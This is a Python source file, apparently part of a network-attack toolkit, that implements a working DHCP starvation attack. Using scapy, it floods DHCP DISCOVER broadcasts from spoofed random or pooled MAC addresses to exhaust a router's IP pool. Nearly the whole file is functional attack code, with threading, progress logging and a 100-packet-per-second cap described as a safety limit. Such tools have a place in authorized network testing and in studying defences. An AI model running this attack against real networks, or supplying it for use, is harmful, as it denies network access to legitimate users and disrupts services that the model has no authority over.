import random
import re
import threading
import time
from collections import deque
from typing import List, Optional

from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Packet
from scapy.sendrecv import sendp
from scapy.arch import get_if_list

from netarmageddon.utils.output_manager import HEAD, INFO, DEBUG, WARNING, ERROR, CMD, CLEAR


class DHCPExhaustion:
    """Simulate multiple DHCP clients to exhaust router's IP pool"""

    MAX_PPS: int = 100  # Class-wide safety limit
    S_PORT = 68
    D_PORT = 67

    def __init__(
        self,
        interface: str,
        num_devices: int = 50,
        request_options: Optional[List[int]] = None,
        client_src: Optional[List[str]] = None,
    ):
        self.start_time = time.time()
        self.interface = interface
        self.running = False
        self._stopped = False
        self.thread: Optional[threading.Thread] = None
        self._validate_interface()

        if num_devices < 1:
            raise ValueError("Number of devices must be at least 1")
        self.num_devices = num_devices
        self.request_options = request_options or list(range(81))
        self.client_src: List[str] = self._validate_macs(client_src) if client_src else []
        self.mac_pool: deque[str] = deque(self.client_src)
        self.sent_macs: set[str] = set()
        self.lock = threading.Lock()

        DEBUG(f"Initialized with {num_devices} devices")
        HEAD("DHCP Attack Configuration")
        CMD(f"┣ Interface: {self.interface}")
        CMD(f"┣ MAC Source: {'Predefined pool' if self.client_src else 'Random generation'}")
        CMD(f"┗ Request Options: {self.request_options}")

    def _validate_interface(self) -> None:
        """Verify network interface exists."""
        DEBUG(f"Validating interface: {self.interface}")
        if self.interface not in get_if_list():
            ERROR(f"Interface {self.interface} not found!")
            CMD(f"Available interfaces: {', '.join(get_if_list())}")
            raise ValueError(f"Interface '{self.interface}' not found")
        INFO("Network interface validated")

    def _rate_limit(self, pps: int) -> int:
        """Enforce packets-per-second safety limit."""
        if pps > self.MAX_PPS:
            WARNING(f"Rate limited {pps} → {self.MAX_PPS} (safety threshold)")
            return self.MAX_PPS
        return pps

    def _validate_macs(self, mac_list: List[str]) -> List[str]:
        """Validate and normalize MAC addresses"""
        DEBUG(f"Processing {len(mac_list)} MAC addresses")
        validated = []
        pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"

        for idx, mac in enumerate(mac_list):
            if not re.match(pattern, mac):
                ERROR(f"Invalid MAC #{idx+1}: {mac}")
                raise ValueError("Invalid MAC format: use '01:23:45:67:89:ab'")
            clean_mac = mac.lower().replace("-", ":")
            validated.append(clean_mac)
            DEBUG(f"Normalized MAC {idx+1}: {clean_mac}")

        INFO("MAC validation completed")
        return validated

    def _generate_mac(self) -> str:
        """Generate MAC from pool or randomly"""
        if self.mac_pool:
            mac = self.mac_pool[0]
            self.mac_pool.rotate(-1)
            DEBUG(f"Using pooled MAC: {mac}")
            return mac

        while True:
            mac = "de:ad:%02x:%02x:%02x:%02x" % (
                random.randint(0, 0xFF),
                random.randint(0, 0x7F),
                random.randint(0, 0xFF),
                random.randint(0, 0xFF),
            )
            if mac not in self.sent_macs:
                self.sent_macs.add(mac)
                DEBUG(f"Generated new MAC: {mac}")
                return mac

    def _create_dhcp_packet(self) -> Packet:
        """Build DHCP discovery packet"""
        mac = self._generate_mac()
        DEBUG(f"Constructing packet for: {mac}")
        DEBUG(f"Source PORT={self.S_PORT} Destinatio PORT={self.D_PORT}")
        return (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=self.S_PORT, dport=self.D_PORT)
            / BOOTP(chaddr=mac)
            / DHCP(
                options=[
                    ("message-type", "discover"),
                    ("client_id", mac),
                    ("param_req_list", self.request_options),
                    "end",
                ]
            )
        )

    def _send_loop(self) -> None:
        """Main attack loop with rate limiting"""
        try:
            INFO("Starting attack sequence")
            sent_count = 0
            self.attack_start = time.time()
            base_pps = max(1, self.num_devices)
            allowed_pps = self._rate_limit(base_pps)
            delay = 1.0 / allowed_pps if allowed_pps > 0 else 0

            HEAD("Attack Parameters")
            CMD(f"┣ Target devices: {self.num_devices}")
            CMD(f"┣ Packet rate: {allowed_pps}/sec")
            CMD(f"┗ Estimated duration: {self.num_devices/allowed_pps:.1f}s")

            while self.running and sent_count < self.num_devices:
                pkt = self._create_dhcp_packet()
                sendp(pkt, iface=self.interface, verbose=False)

                DEBUG(f"Packet #{sent_count+1} summary: {pkt.summary()}")
                CLEAR()
                INFO(
                    f"Progress: {sent_count+1}/{self.num_devices} ({((sent_count+1)/self.num_devices)*100:.0f}%)"
                )

                sent_count += 1
                time.sleep(delay)

            if sent_count >= self.num_devices:
                INFO("Target device count reached")
                self.stop()

        except Exception as e:
            ERROR(f"Critical failure: {str(e)}")
            CLEAR()
            self.stop()

    def user_abort(self) -> None:
        """Handle graceful shutdown from SIGINT"""
        CLEAR()
        WARNING("User requested to stop")
        self.stop()

    def start(self) -> None:
        """Launch attack thread"""
        if not self.running:
            DEBUG("Spawning attack thread")
            self.running = True
            self.thread = threading.Thread(target=self._send_loop)
            self.thread.start()
            INFO("Attack started")

    def stop(self) -> None:
        """Stop attack thread"""
        if not self.running:
            return
        DEBUG("Initiating shutdown sequence")
        self.running = False
        if self.thread and self.thread.is_alive():
            if threading.current_thread() is not self.thread:
                self.thread.join(timeout=5)
                if self.thread.is_alive():
                    WARNING("Thread termination delayed - forcing cleanup")
        CLEAR()
        if hasattr(self, 'start_time'):
            duration = time.time() - self.start_time
            INFO(f"Attack duration: {duration:.1f}s")
            INFO("✔ Attack successfully terminated")
        self._stopped = True

    def __enter__(self) -> "DHCPExhaustion":
        self.start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        if not getattr(self, '_stopped', False):
            self.stop()
